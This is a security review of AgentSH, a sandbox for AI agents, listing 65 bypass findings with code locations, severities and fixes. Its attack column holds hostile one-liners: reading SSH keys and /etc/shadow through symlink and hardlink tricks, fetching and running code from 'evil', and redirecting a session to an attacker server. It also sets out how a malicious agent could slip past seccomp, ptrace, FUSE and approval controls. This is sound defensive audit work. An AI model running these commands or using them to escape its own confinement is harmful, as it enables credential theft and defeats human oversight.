# AgentSH — adversarial (red-team) review of its protections

Date: 2026-11-07 · Reviewed tree: `main` @ 0ce9939b · Findings fixed in PR #454 (merged `c3470a52`).

**Status: adjudicated.** Every row below was re-checked against the code by `openai-codex/gpt-6.1-sol`
(thinking xhigh, 5 read-only shards). Column **Adj** carries the outcome: ✅ confirmed / ⚠️ real but
overstated / ❌ not real, plus the severity after adjudication. Evidence per row, the three refutations
and the two issues the adjudicator found that this review missed are in
[`adversarial-review-2026-11-adjudication.md`](adversarial-review-2026-11-adjudication.md)
(per-shard raw tables were kept locally, not committed).

Originals kept, not deleted: a refuted row is struck through and marked ❌ so the paper trail survives.

## Worklog

Merged as `c3470a52` (PR #454, squash) on 2026-11-08. Branch `fix/adv-review-2026-11`
(base `main` @ 0ce9939b), order of work = severity, then cheapness.
Verification per item: `go build ./...`, `GOOS=windows/darwin go build ./...`, targeted `go test`.
Known pre-existing failure on this machine: `internal/fsmonitor TestFUSE_FsyncFlushLseekPassthrough`
(fails on `main` too, unrelated).

### Done

| # | Fix | Commit |
|---|---|---|
| 4 (Critical) | `approve` no longer degrades to allow: engine maps approve to deny when approvals are unconfigured; `fsmonitor.Hooks.Approvals` is now an interface and fails closed when absent; approver plumbed `api -> platform.FSConfig -> FUSE hooks`. Tests: `internal/policy/engine_approve_test.go`, `internal/fsmonitor/approve_test.go` | `4cae9f7c` |
| 15 (High) | ptrace `HandleFile` evaluates `Path2` too (rename/link/symlink destination), stricter decision wins, `path2` added to the event | `227c4a1b` |
| 42 (High) | ptrace `readArgv` reports truncation (slot budget, byte budget, over-long element) and the execve handler denies with rule `argv_truncated` | `06055ce5` |
| 24 (High, known C1) | shim CLI bypass treats standalone `&`, `>(`/`<(` **and** `&>`/`&>>` as compound; table test added | `3c30670c` |
| review loop | 5 roborev rounds on the branch (jobs 19038-19045). Fixed in follow-ups: shared macOS/Windows FUSE approve path, approval ID/CommandID correlation, `renameat2` approve-then-fail, `readArgv` false truncation at exactly `maxArgc`, POSIX `sh` `&>`, approval id now returned per-op instead of a path-keyed map | `3c17bacc`, `3b816bc3`, `e1120054`, `af0cbb2d` |
| CI | darwin policysock shadow-mode test updated to the fail-closed expectation; `fsmonitor/approve_test.go` tagged linux; `build-linux-arm64-cgo` repaired for the ubuntu-26.04 runner (ports suite from the runner codename + `--allow-downgrades`) | `af0cbb2d`, `c3470a52` |

PR #454: all checks green (test-linux, test-macos, test-windows, integration, build-linux-arm64-cgo, build-matrix x4), squash-merged to `main`.

Behavior changes to mention in release notes: an `approve` rule now **denies** when the approvals
subsystem is not configured (previously it allowed silently). In ptrace mode a command line with
>1000 args, >64 KiB of args, or a single argument >4 KiB is denied.

### In progress (next, in this order)

| # | Finding | Plan |
|---|---|---|
| N1 (High) | PTY exec installs no seccomp wrapper and no ptrace attach | route `pty.Start` through the same `setupSeccompWrapper`/attach path as `exec_stream`, or refuse PTY when `seccomp.execve`/ptrace are configured |
| 1 (High) | seccomp file monitor judges the lexical path | resolve the absolute path through `/proc/<pid>/root` (mirroring `ptrace.resolveViaProc`) before `CheckFile`; fail closed on resolution error |
| 3 (High) | FUSE leaves `link`/`mknod`/setxattr/chown/utimes to the root loopback | add the node ops with `check()` + events, and make the seccomp-to-FUSE deferral op-aware |
| 17 (High) | ptrace dispatches on the raw nr, dropping the ABI | keep `Arch` in `SyscallEntryInfo`, deny non-native arch, add the x32 high-bit guard in the BPF |
| 29/30 (High) | no session ownership on the HTTP API; totp/webauthn never prompt | per-session principal check; drive the prompt off `mode != api` |
| 5, 6, 7, 9, 11, 12, 13 (High) | cap drop dead code, shim PATH identity, gRPC RBAC, io_uring, `sh script.sh`, netns UDP, MCP registry | after the above |

### Process (how this was worked, and when it stopped)

1. Severity order, not file order: the adjudicated Critical first, then High, and inside a level the
   cheapest complete fix first. One commit per finding, each with its own test.
2. roborev reviewed every commit. The loop stopped on a **diminishing-returns** test, not a count:
   a round is the last one when the review is clean (round 5, job 19045) or when a round only
   produces findings inside the previous round's own fix. Severity went
   High+Medium (round 1) → Medium x2 → Medium → Medium x3 → clean, so round 5 closed it.
3. Review findings that were wrong or too expensive were answered, not obeyed: the `&>` exemption
   became a POSIX-`sh` compound operator, but widening `platform.PolicyEngine` just to carry a rule
   name into a Windows-only approval prompt was not done (noted in the job comment).
4. CI was part of the loop: two real failures (darwin policysock shadow-mode expectation, Windows
   test binary missing build tag) and one runner-image break (`libseccomp-dev` `Breaks` across
   architectures after the runner moved to ubuntu-26.04).
5. Squash-merge only after every job was green (9 checks, `fargate-e2e` skipped).

### Not started

Everything else (Medium/Low), plus one runtime probe each for the 12 probe-dependent rows
(#1 mode, #9 io_uring availability, #12 transparent on/off, #17 32-bit ABI, #19 Yama, #20 UID
permissions, #40 libseccomp width, #43 prefilter injection, #47 darwin/win FUSE, #51 ptrace
deployment, #55 WTP identity, #57 PF callers).

## Method

- 11 parallel read-only adversarial lanes, one per attack surface, run as subagents on the same
  model + reasoning level as the parent session (`lunaroute/deepseek-4.1-flash-abliterated`, thinking max).
  Lanes: paths/policy, FUSE, ptrace, seccomp+Landlock+caps, network, shell shim, auth/approvals/IPC,
  DLP/secrets/audit, env/exec, MCP/pkgcheck/skillcheck, darwin/WSL2.
- Each lane started from the existing `AUDIT-FINDINGS.md` (known items = KNOWN-x) and hunted for **new**
  bypasses; known items were re-verified in place.
- The parent re-read and confirmed the top findings itself (Conf `V*`), then ran the adjudication pass.
- Confidence column: `V` = verified by reading the cited code, `V*` = also confirmed by the parent,
  `S` = suspected.
- Assumed attacker: malicious agent code, unprivileged uid, inside `/workspace`, normal Linux
  deployment (`full` or `ptrace` mode), no root.
- Nothing was executed: no FUSE mount, no eBPF attach, no syscall PoC (kernel/root required).
  macOS, Windows and the DB proxy were reviewed by reading code only.

Per-lane raw reports and the fan-out scripts stayed local (`tmp/adv-lane-*.md`, `tmp/adv-workflow.js`).

## Tally

| | Original | After adjudication |
|---|---|---|
| Critical | 13 | **4** |
| High | 27 | **11** |
| Medium | 18 | **22** |
| Low | 7 | **28** |
| Total | 65 | 65 (3 of them not real) |

Row outcomes: **19 ✅ confirmed**, **43 ⚠️ overstated**, **3 ❌ refuted** (#10, #21, #62).
Of the overstated rows, 12 cannot be settled by reading at all (#1, #9, #12, #17, #19, #20, #40, #43,
#47, #51, #55, #57): they need one runtime probe each (kernel config, libseccomp, Yama, deployment mode).

## Findings, ordered by severity

Legend for **Adj**: ✅ confirmed · ⚠️ real but overstated · ❌ not real · then the post-adjudication severity.

### Critical

| # | Issue | Where | Attack | Conf | Adj | Smallest fix |
|---|---|---|---|---|---|---|
| 1 | seccomp file monitor judges the **unresolved** path string — no symlink / `/proc` magic-link resolution (`/proc/*/fd` aliases *are* resolved) | `internal/netmonitor/unix/file_syscalls.go:407-425` → `file_handler.go:104-117` | `ln -s ~/.ssh /workspace/l && cat /workspace/l/id_rsa` — deny/approve rules never match, kernel resolves after CONTINUE | V* | ⚠️ High | resolve via `/proc/<pid>/root` (as ptrace does) and re-check; fail closed on resolution error |
| 2 | `truncate`/`ftruncate` missing from the seccomp and ptrace syscall sets (FUSE *does* check truncate as a write) | `netmonitor/unix/file_syscalls.go:28-38`, `ptrace/syscalls.go:13-16`; contrast `fsmonitor/fuse.go:310-326,468-470` | `python3 -c 'import os;os.truncate(os.path.expanduser("~/.ssh/authorized_keys"),0)'` — a uid-writable, deny-write path; `/etc/hosts` needs root and was a weak example | V* | ⚠️ High | add both numbers to every file-syscall set, map to `write` |
| 3 | FUSE implements only ~13 ops: `link`, `mknod`, `setxattr/removexattr`, `chown`, `utimes` run in the **root daemon** unchecked and unaudited; seccomp defers all under-mount syscalls to FUSE | `internal/fsmonitor/fuse.go` (no `Link`/`Mknod`/`Setxattr`), `fuse.go:295-330`, `file_handler.go:116` | `ln /workspace/secrets/db.conf /workspace/t && cat /workspace/t`; `setfattr -n user.x -v "$(base64 -w0 secrets/db.conf)" app.log` | V* | ⚠️ High | implement the missing node ops with `check()`+`emitFileEvent`; make the seccomp→FUSE deferral operation-aware (device-node/chown examples need root-daemon + CAP_MKNOD, overstated) |
| 4 | `decision: approve` is auto-allow by default: `enforceApprovals = Approvals.Enabled && Mode != ""` (default false) and the FUSE hooks carry **no** approvals manager | `api/core.go:560,754,1498`, `platform/linux/filesystem.go:259-275`, `fsmonitor/fuse.go:588-594` | with shipped `agent-default.yaml`, `echo x >> .env` / `cat ~/.ssh/id_rsa` never prompt — and this persists even when approvals *are* enabled | V* | ✅ Crit | wire approvals into `FSConfig`; block on `EffectiveDecision != allow`  · **FIXED 4cae9f7c** (merged c3470a52) |
| 5 | Capability dropping is dead code — only caller is a test-only Landlock hook; `agentsh-unixwrap` never drops | `api/landlock_exec.go:79,87`, `capabilities/drop.go:61`, `api/process_unix.go:46` | privileged daemon: child keeps `CAP_DAC_OVERRIDE`/`CAP_KILL` → `cat /etc/shadow`; an unprivileged-uid child does not inherit them, so scope is narrower than claimed | V* | ⚠️ High | capset+PR_CAP_AMBIENT+PR_CAPBSET_DROP in the wrapper pre-exec, or document that caps must be dropped outside |
| 6 | Shim `isAgentshCommand` compares **two caller-controlled PATH lookups** → skips kernel-install *and* policy | `cmd/agentsh-shell-shim/main.go:71-81,392-410,458-463` | at shim entry: `PATH=/workspace:$PATH`, `cp /sbin/shutdown /workspace/agentsh`, `sh -c 'agentsh -h now'` (or `AGENTSH_BIN=shutdown`) → real shell, no seccomp filter installed; a shim already inside an enforced tree keeps its inherited filter | V* | ⚠️ High | compare against a root-owned absolute path; move the bypass after `kernelinstall.Install` |
| 7 | gRPC control plane authenticates but **never authorizes** | `internal/api/grpc.go:925-956`, `:752-775` | `agentsh approve list` → `agentsh approve resolve <own-id> --allow` (HTTP path requires approver/admin); `config.yml:20` ships `grpc.enabled: false` | V* | ⚠️ High | return `(role, error)` from the interceptor + per-method role table |
| ~~8~~ | `${HOME}` / `${PROJECT_ROOT}` come from the **session-create request** (or caller `$HOME`) | `internal/api/core.go:647-687`, `policy/engine.go:446-450` | `{"home":"/tmp/x"}` re-points `deny ${HOME}/.ssh/**`; the `project_root:"/"` variant is wrong — `//**` does not match `/**` (`vars.go:16-39`) | V* | ⚠️ High | resolve HOME from the target uid; reject widening PROJECT_ROOT values |
| 9 | io_uring has zero coverage in ptrace mode (prefilter = `RET_ALLOW` for unlisted syscalls) | `ptrace/syscalls.go:61-95`, `ptrace/seccomp_filter.go:347-349` | `io_uring_setup` + SQEs `IORING_OP_OPENAT(/etc/shadow)`, `WRITE`, `SOCKET`+`CONNECT`, one `io_uring_enter`; needs io_uring available and ptrace-only mode — the seccomp wrapper blocks it when `block_io_uring` is on | V* | ⚠️ High | block the 3 ring syscalls by default in both engines |
| ~~10~~ | ~~Agent-supplied `AGENTSH_SECCOMP_CONFIG` / `AGENTSH_NOTIFY_SOCK_FD` shadow the server's (duplicate env key)~~ | `shim/kernelinstall/install_linux.go:235-237`, `cli/wrap.go:141-145` | ❌ **NOT REAL** — Go `exec.Cmd` dedups `Env` **last value wins** and the authoritative values are appended last, so `os.Getenv` in the wrapper sees the server's value | V | ❌ — | drop the row |
| 11 | Command policy only understands `-c`; `sh script.sh` / `sh -s` are neither derived nor opaque-denied | `internal/shellparse/shellparse.go:449-464`, `policy/engine.go:699` | `printf 'shutdown -h now\n' > s.sh; sh s.sh` — real while execve interception is off (the default config); closed once `seccomp.execve` is on | V* | ⚠️ High | classify shell + non-`-c` payload as opaque |
| 12 | Transparent netns redirects only IPv4 TCP + UDP/53, no DROP rules, host veth IP exempted first | `netmonitor/netns_linux.go:30-44,113-143` | `curl --http3-only https://blocked.example/`, `nc -u 203.0.113.9 51820`; needs transparent mode, which `config.yml:195` ships off (root host) | V* | ⚠️ High | DNAT/redirect all protocols or add a default-DROP filter chain + ip6tables |
| 13 | MCP tool policy is inert: registry registered with `nil` tools, and the only producer of `mcp_tool_seen` events (the shim inspector) is never called | `session/llmproxy.go:74`, `proxy/mcp_intercept.go:171`, `cmd/agentsh-shell-shim/main.go:335` (no caller), bridge at `server.go:1025-1030` | `tool_use run_shell` forwarded byte-identical under `tool_policy: allowlist` + `fail_closed: true` | V | ⚠️ High | register real tool lists, fail closed on unknown tool, or delete the MCP seam |

### High

| # | Issue | Where | Attack | Conf | Adj |
|---|---|---|---|---|---|
| 14 | ptrace cleans `..` **before** following symlinks; opened FDs are re-checked afterwards | `ptrace/handle_file.go:141-142,195-207`, `tracer.go:1409-1457` | `ln -s $HOME/.ssh /workspace/l; head /workspace/l/../.ssh/id_rsa` → checked as `/workspace/.ssh/id_rsa`; residual on legacy `open`/mutations only | V | ⚠️ Med |
| 15 | ptrace checks only `fc.Path`; `renameat2`/`linkat` **destination** never evaluated | `api/ptrace_handlers.go:195` | `renameat2("/workspace/a","/workspace/protected/a")`; `linkat("/workspace/secret","/workspace/pub")+open(pub)` | V | ✅ High  · **FIXED 227c4a1b** (merged c3470a52) |
| 16 | `renameat`, `utimensat` missing from the syscall sets (`fchmodat2` is in ptrace, `mknodat` in the seccomp list) | `netmonitor/unix/file_syscalls.go:28-38`, `ptrace/syscalls.go:15`, `seccomp_linux.go:665` | `renameat` out of a denied tree; `utimensat` anti-forensics | V* | ⚠️ Med |
| 17 | Foreign ABI (`int $0x80`) dispatched by colliding native numbers → `default: allow`; x32 high-bit still falls through (KNOWN-C2) | `ptrace/syscall_context.go:89-92`, `tracer.go:1360`, `ptrace/seccomp_filter.go:53-85` | 32-bit shellcode via `int $0x80`, `eax=11` = amd64 `munmap` → allow; needs the 32-bit/x32 ABI enabled | V* | ✅ High |
| 18 | UDP unchecked: ptrace `sendto` never policy-evaluated, seccomp-notify continues AF_INET, `sendmsg/sendmmsg` trapped nowhere | `ptrace/handle_network.go:130-132`, `netmonitor/unix/handler.go:305-317` | `sendto(s, secret, n, 0, &sin{1.2.3.4:4444}, 16)`; the 129-byte DNS variant is unproven | V* | ⚠️ High |
| 19 | unix-socket policy on the raw sockaddr string; fails **open** when `process_vm_readv` fails; `listen`/`socket` arg indices wrong | `netmonitor/unix/handler.go:69-84,305-317` | `ln -sf /var/run/docker.sock /tmp/d.sock && curl --unix-socket /tmp/d.sock …`; also needs the alias to match an allow rule and Yama to block the read | V | ⚠️ High |
| 20 | Signal policy: `pidfd_send_signal(424)` intercepted nowhere; ptrace path allows **all** signals | `signal/seccomp_linux.go:23-27`, `ptrace/handle_signal.go`, `api/ptrace_handlers.go:364` | `pidfd_open(target); pidfd_send_signal(fd, SIGKILL)` — bounded by UID permissions on the target | V* | ⚠️ High |
| ~~21~~ | ~~`fexecve` (431) not trapped → unaudited exec~~ | `netmonitor/unix/seccomp_linux.go:340-343`, `handler.go:901-912` | ❌ **NOT REAL** — x86-64/arm64 syscall 431 is `SYS_FSCONFIG` (`zsysnum_linux_amd64.go:352`); `fexecve` is not a syscall there, glibc uses the trapped `execveat` | V | ❌ — |
| 22 | Command rules are basename matches, no binary identity | `policy/engine.go:254-268,1451-1467` | `cp /sbin/shutdown /workspace/git && /workspace/git -h now` — defeats basename-only rules (what the shipped policies use), not absolute-path allowlists | V | ⚠️ High |
| 23 | Shebang interpreter invisible to exec policy | `netmonitor/unix/handler.go:355-400,416-425` | `#!/usr/bin/env -S python3 -c '…'` in an allowed script; the follow-on exec is re-trapped as `execveat` unless interception is off | V | ⚠️ Med |
| 24 | Shim shell-c bypass: standalone `&` and `>(`/`<(` not rejected (KNOWN-C1) | `cmd/agentsh-shell-shim/main.go:415-436` | `sh -c 'agentsh --version & curl -o /tmp/e http://evil & sh /tmp/e'` | V* | ✅ High  · **FIXED 3c30670c** (merged c3470a52) |
| 25 | DLP never inspects non-string JSON scalars and never decodes base64 (`\u` escapes *are* fine — JSON is unmarshalled first) | `proxy/dlp.go:183,203-240` | `{"card":4111111111111111,"ssn":123456789}` forwarded; `TotalRedactions: 0` | V* | ⚠️ High |
| 26 | Proxy logs **post-hook** headers/path → real upstream credentials written to disk | `proxy/credshook.go:44-49`, `declared_service.go:732-733` | `curl -H "X-Trace: $FAKE" $GITHUB_API_URL/...` then `grep ghp_ ~/.agentsh/sessions/*/llm-requests.jsonl` | V | ✅ High |
| 27 | Audit chain: delete `<log>.chain` + truncate log leaves no external anchor (a signed `sidecar_missing` rotation *is* recorded) | `store/integrity_wrapper.go:137,529` | truncate the log at entry N, `rm *.chain`, restart — reset visible, tail completeness unprovable | V | ⚠️ Med |
| 28 | `policies.allowed` allowlist ignored on session create | `api/core.go:633-636,695-696`, `policy/manager.go:35-44` | `POST /sessions {"policy":"bench-allow-all"}` — needs a weaker policy deployed | V* | ✅ High |
| 29 | No per-session authorization in the HTTP API | `api/app.go:321-340,796-811,1400-1415` | list sessions → `PATCH env AGENTSH_SERVER=http://attacker` on a victim session, `exec`, `searchEvents?text_like=password` | V | ✅ High |
| 30 | `approvals.mode: totp`/`webauthn` never prompt (prompt goroutine only for `local_tty`) | `approvals/manager.go:88-91,240-250`, `api/app.go:1472-1495` | "second factor" decorative; resolve via API/gRPC with no code (still needs approver/admin creds over HTTP) | V | ✅ High |
| 31 | FUSE `readlink` validates only the link, not the target; kernel resolves the target on the host superblock | `fsmonitor/fuse.go:346-357,450-452`, `file_handler.go:116-120` | `ln -s /home/victim/.bashrc /workspace/b && echo 'curl evil\|sh' >> /workspace/b` — overlaps #1, mode-dependent | V | ⚠️ Med |
| 32 | Silent degradation: seccomp wrapper returns the request unwrapped on error while `execveEnforcementActive()` still says true; `agentsh wrap` falls back to an unwrapped agent; `agentsh-unixwrap` `exit 0` without exec'ing | `api/core.go:114-128`, `api/session_policy.go:69-77`, `cli/wrap.go:132-137`, `unixwrap/main.go:119-121` | missing `agentsh-unixwrap` in server PATH → unenforced run, audit says allow | V | ⚠️ High |
| 33 | Landlock: `deny_paths` is a no-op when any ancestor allow exists (union semantics); apply failure logs "continuing without" | `landlock/ruleset.go:219-260,410-419`, `unixwrap/main.go:193-198` | `deny_paths:["/var/run/docker.sock"]` + `allow_write:["/var/run"]` → `ln -sf … /var/s; docker -H unix:///var/s ps`; opt-in layer, needs the extra perms | V | ⚠️ Med |
| 34 | pkgcheck: resolver runs in agent `WorkingDir` but reports `registry.npmjs.org`; non-default index skipped → allow; `npx/uvx/pipx run` unclassified (`npm ci` *is* classified under `all_installs`) | `pkgcheck/resolver/npm.go:87,124-134`, `privacy.go:80-85`, `interceptor.go:73-136`, `orchestrator.go:193-196` | `printf 'registry=http://127.0.0.1:8080/\n' > .npmrc; npm install left-pad@1.3.0` → allow verdict, attacker tarball | V | ⚠️ Med |
| 35 | MCP: `Inspect` errors swallowed (JSON-RPC batch array uninspected); results only `content[].type=="text"` — dormant today because the wrapper has no caller | `shim/mcp_bridge.go:35`, `mcpinspect/protocol.go:55-58,143-186`, `shim/mcp_exec.go:46` | `[{…sampling/createMessage…}]` forwarded despite `sampling.policy: block` | V | ⚠️ Med |
| 36 | Env policy: PTY + streaming exec pass an **empty** policy; `block_iteration` has no writer; blocklist misses `GIT_CONFIG_*`, `PIP_*`, `JAVA_TOOL_OPTIONS`, `XDG_*`, `LESSOPEN`; `allow: ["*"]` disables the secret blocklist | `api/pty_core.go:158`, `exec_stream.go:297`, `exec.go:200-201,765-800`, `policy/env_policy.go:60-75,220-286` | `agentsh exec --pty $S env` leaks session/request vars the policy filtered (host env is pre-filtered at `exec.go:699-708`) | V* | ⚠️ High |
| 37 | macOS/Windows tier: ESF exec rules never populated; 0666 policy socket at hardcoded `/tmp`, loss of the socket changes connectivity not cached sessions; WSL2/Lima unwired; WSL2 `sh -c` injection (KNOWN-C3) | `darwin/policysock/handler.go:180-192`, `policysock/server.go:195-210`, `macwrap/profile.go:15`, `platform/factory.go:239-243`, `wsl2/sandbox.go:172` | `cp /usr/bin/security /workspace/s && /workspace/s find-generic-password -w`; SBPL fallback is deny-default, so milder than claimed | V | ⚠️ Med |
| 38 | Transparent HTTP proxy evaluates policy on port 80 while dialing the real port; declared-service fail-closed missing on the TCP path (CONNECT *does* check CIDRs) | `netmonitor/proxy.go:176,325,343,433`, `transparent_tcp.go:99-155`, `policy/engine.go:1186-1212` | `curl -x <proxy> http://api.allowed.example:6379/` checked as port 80, dialed 6379 | V | ⚠️ High |
| 39 | DNS ip→domain cache: an allowlisted name that resolves to an internal IP authorises the raw IP | `netmonitor/dns.go:179-182`, `transparent_tcp.go:125-131`, `policy/engine.go:586-610` | seed `internal.agent.example A 10.0.0.5`, then `--resolve` to it; earlier CIDR denies still hold, needs DNS control | V | ⚠️ Med |
| 40 | seccomp socket-family/socket-rule comparisons use the full 64-bit `domain`; kernel truncates to `int` | `netmonitor/unix/seccomp_linux.go:428-432,762-768` | `syscall(SYS_socket, 0x1_0000_0000\|38 /*AF_ALG*/, 5, 0)` → rule doesn't match, socket created; AF_ALG availability unprobed | S | ✅ High |

### Medium

| # | Issue | Where | Attack | Conf | Adj |
|---|---|---|---|---|---|
| 41 | `http_services` path rule matched on the once-decoded path, forwarded escaped | `policy/http_service_check.go:41-56`, `proxy/declared_service.go:196,345-346`, `http_service_compile.go:83` | `GET /svc/api/x/%252e%252e/admin/delete` — `/api/*` is single-segment, so this needs an `/api/**` rule plus upstream double-decoding | S | ⚠️ Med |
| 42 | argv truncation: reads stop at 1000 args / 4096 B per arg and leave `Truncated=false` | `ptrace/memory.go:321-341`, `tracer.go:1945` | put `--data-binary @/etc/shadow` at arg #1001 to skip an args regex | V | ✅ High  · **FIXED 06055ce5** (merged c3470a52) |
| 43 | `clone(CLONE_UNTRACED)` creates a child the tracer never sees (prefilter enabled by default limits it) | `ptrace/tracer.go:632-645,1586-1645`, `config/ptrace.go:53` | do the traffic in the untraced child | V | ⚠️ Med |
| 44 | Policy op vocabulary mismatch: `read`/`list` never produced by the Linux mapper (`open` is), so rules listing only `read` are inert | `policy/engine.go:900-915,1224`, `netmonitor/unix/file_syscalls.go:294-344`, `fsmonitor/fuse.go:248,365` | `deny **/secrets/** operations:[read]` never fires; `agent-strict.yaml:103-112` read rules omit `open` | V | ⚠️ Med |
| 45 | File-rule globs are byte-exact; no case folding / NFC on case-insensitive or NFD filesystems | `policy/engine.go:187,935`, `platform/fuse/ops.go:34-38` | macOS/Windows: `cat .ENV`, `cat $HOME/.SSH/id_rsa` | V | ✅ Med |
| 46 | `process_contexts.*.file_rules/network_rules/env_policy` parse but are never evaluated | `policy/model.go:266-269`, `context_eval.go:72-150,374-460` | parent-conditional deny in YAML is silently inert | V | ✅ Med |
| 47 | `platform.PolicyAdapter` returns `EffectiveDecision` only → `redirect`/`approve` degrade to allow, `soft_delete` unreachable | `platform/policy_adapter.go:31-36`, `platform/fuse/ops.go:169-174,274-278` | darwin/Windows FUSE: redirect ignored, `O_RDWR` checked as write only then `read()` | V | ✅ Med |
| 48 | `X-Session-ID` request header decides audit attribution and approval scope | `proxy/proxy.go:329-332`, `declared_service.go:140,235` | `curl -H "X-Session-ID: victim-session" $LLM_PROXY/v1/messages` | V | ✅ Med |
| 49 | Secret cache hit returns the secret with no audit event and no approval re-check (KNOWN-H1); `pkg/secrets` has no CLI/production wiring | `pkg/secrets/manager.go:274-277`, `cache.go:87-89`, `cli/root.go:28-54` | second `secrets get` in 5 min → no `SecretAccessed` | V* | ⚠️ Low |
| 50 | Shim trusts `AGENTSH_SESSION_ID`/`AGENTSH_WORKSPACE` verbatim (workspace normalized; in-session guard applies) | `shim/session_id.go:42-43,99-104`, `shim/main.go:163` | `AGENTSH_SESSION_ID=<looser-session> sh -c '…'`; overlaps #29 | V | ⚠️ Med |
| 51 | `wrap-init` trusts `caller_uid` from the body (0 disables the peer check, socket falls back to 0666 in `/tmp`); the handshake binds any PID into your session | `api/wrap.go:93-107,199-201`, `wrap_linux.go:377,410,427`, `ptrace/tracer.go:538-554` | `wrap-init {"caller_uid":0}` then feed another session's PID → `BindSession`; ptrace deployments only | V | ✅ **High** |
| 52 | FUSE: `strict` audit sink nil (fail-closed vacuous); delete event emitted before audit policy; trash inside the workspace, 0640 manifest in 0755 dir, `UnixNano()` tokens | `platform/linux/filesystem.go:283-290`, `fsmonitor/policy.go:49-60`, `fsmonitor/fuse.go:149-163,732-745`, `trash/trash.go:100-190,351-359` | `rm /workspace/x` under `soft_delete`, read/delete `.agentsh_trash/payload/*`; tampering needs writable trash + an operator restore | V | ⚠️ Med |
| 53 | envshim interposes only 5 libc symbols → `environ`, `/proc/self/environ`, static/Go binaries see everything (the server pre-filters env, so it is not a filter bypass) | `shim/linux/envshim.c:361-501`, `api/exec.go:186,750` | `printenv` / `cat /proc/self/environ` shows what envshim tried to hide | V | ⚠️ Low |
| 54 | Audit log created 0644 in a 0755 dir (sidecar is 0600), including after rotation | `store/jsonl/jsonl.go:79-85,225` | another local uid `cat`s the command/path/host history | V* | ✅ Low |
| 55 | Audit WTP wire-chain sequence restarts at 0 each daemon start while `prev_hash` continues | `store/composite/composite.go:57-172`, `server/wtp.go:156-158` | restart → colliding `(sequence, generation)`; normally a new identity is issued | V | ⚠️ Low |
| 56 | skillcheck rescans only on `SKILL.md` writes; verdict cached by the old tree hash | `skillcheck/watcher.go:207-219`, `loader.go:108` | stage benign `SKILL.md`, wait for `allow`, then drop `run.sh`; opt-in scanner | V | ✅ Low |
| 57 | darwin network: pf `rdr` only `on lo0`; NE `blockingEnabled=false`; PNACL never wired; root `WriteFile` to predictable `/tmp/agentsh-pf.rules` (PF setup has no production caller) | `darwin/network.go:29,69,90-104`, `FilterDataProvider.swift:11,128-135`, `policysock/server.go:463` | cached denies still drop flows, so the claim is milder than stated | V | ⚠️ Low |
| 58 | No `RLIMIT_CORE`/`core_pattern` handling; core dumps of secret-bearing children can land in the agent-writable cwd | `unixwrap/main.go:259`, `darwin/sandbox_resources.go:37,53` | crash a wrapper-held secret into a core file; emission and destination host-dependent | V | ⚠️ Low |

### Low

| # | Issue | Where | Attack | Conf | Adj |
|---|---|---|---|---|---|
| 59 | Landlock network flips fully open when both connect and bind are allowed; otherwise rules grant port 0 only | `landlock/ruleset.go:193,371-400` | enable bind for a dev server → `nc 169.254.169.254 80` unwatched | V | ✅ Low |
| 60 | TOTP has no replay registry (±1 window) — latent, because the prompt is never launched outside `local_tty` | `approvals/totp.go:27`, `manager.go:240` | re-use an observed code for 90 s; overlaps #30 | V | ⚠️ Low |
| 61 | `pkg/identity` + `pkg/tenant` are dead code (plaintext key compare, unlocked returned-object mutation) | `pkg/identity/agent.go:226`, `store.go:83,319`, `pkg/tenant/store.go:115,273` | n/a today; no production imports | V | ⚠️ Low |
| 62 | `IsRealPathUnder(path, "/")` returns true unconditionally, so the `..`-escape fast check always passes | `pathutil/pathutil.go:40-44`, `fsmonitor/path.go:33-80`, `fsmonitor/fuse.go:550` | not a bypass on its own: `/` contains every resolved path and policy is still applied to the resolved target (the illustrated symlink read is #1/#31) | V | ❌ Low |
| 63 | MCP severity reporting and >1 MiB line handling (`detector.go:87` already sorts highest-first, so the severity claim is wrong; the wrapper is dead) | `mcpinspect/detector.go:87-88`, `mcpinspect/inspector.go:134-138`, `shim/mcp_exec.go:249-254` | a >1 MiB line discards the rest of the server's stdout | V | ⚠️ Low |
| 64 | `chown`/`utimes` produce no event; `fchmodat2` is audited in ptrace (overlaps #3/#16/#52) | `fsmonitor/fuse.go:295-330`, `api/ptrace_handlers.go:200-210` | rewrite mtimes on `deny write` files, audit stays clean | V | ⚠️ Low |
| 65 | Documented-but-nonexistent surfaces: `agentsh mcp-server`, `agentsh mcp pins` verification wiring, native Lima/WSL2 registration, `sandbox.network.intercept_mode` (no reader) | `cli/root.go:28-54`, `api/platform_windows.go:6`, `platform/factory.go:118-133`, `config/config.go:442` | operator relies on a feature that never runs | V | ✅ Low |

## Found during adjudication (not in the original review)

| # | Sev | Issue | Where | Attack | Conf |
|---|---|---|---|---|---|
| N1 | **High** | PTY exec skips all kernel enforcement: no seccomp wrapper, no ptrace attach, only FUSE | `api/pty_core.go:158,187-198` → `pty/engine_unix.go:114-141`; compare `core.go:1086,1112`, `exec_stream.go:198,206`, `grpc.go:401` | `agentsh exec --pty $S -- sh -c '…'` (or the PTY-WS endpoint) runs with only FUSE in front, while non-PTY exec installs both layers | V* |
| N2 | Medium | ptrace detaches children when prefilter injection fails | `ptrace/tracer.go:880-887,1738-1765` | no `CLONE_UNTRACED` needed: a failed injection leaves descendants unenforced | V |

## Known items still present (re-verified, not re-scored)

C1 (`&` in shim), C2 (x32), C3 (WSL2 injection), C4 (pkgcheck partial), H1, H5, H7, H13, H15, H16, M3, M4, M5, M25, M32, M40, M44, M49, M56.

Worse than previously reported: H13 — `DropCapabilities` has **no production caller at all** (row 5).

## What was checked and found sound

`internal/ipset`, `netmonitor/sni.go` (length bounds), `socks.go` (fail-closed), proxy-env injection,
eBPF `connect.bpf.c` (deny-before-default-deny, CIDR LPM), `internal/envinject` ordering/dedup, `stub`
frame cap, go-fuse `RESOLVE_NO_SYMLINKS` on loopback opens, FUSE death = fail-closed, `SO_ORIGINAL_DST`
use in `transparent_tcp.go`, execveat dirfd/`AT_EMPTY_PATH` resolution, wrapper ACK/fail-closed
sequence, `shim.conf` read from `/etc`, `AGENTSH_SHIM_FORCE` can only add enforcement, approvals
timeout/cancel resolve deny, WebAuthn assertion single-use, OIDC group→role mapping, cgroup limits
(typed errors + degraded events), Go `exec.Cmd` env dedup (last wins).

## Verdict

- After adjudication the defensible core is small: **approval gates never gate (#4)**, the **symlink/
  unresolved-path bypass (#1, #31)**, **hardlink laundering through unchecked FUSE ops (#3)**,
  **no session ownership (#29) and no authorization on gRPC (#7)**, **ptrace destination/argv/ABI gaps
  (#15, #42, #17)**, **shim `&` (#24)** — plus the new **PTY skips kernel enforcement (N1)**.
- Fix order: #4 → N1 → #1 → #3 → #15 → #29/#30 → #24 → #17.
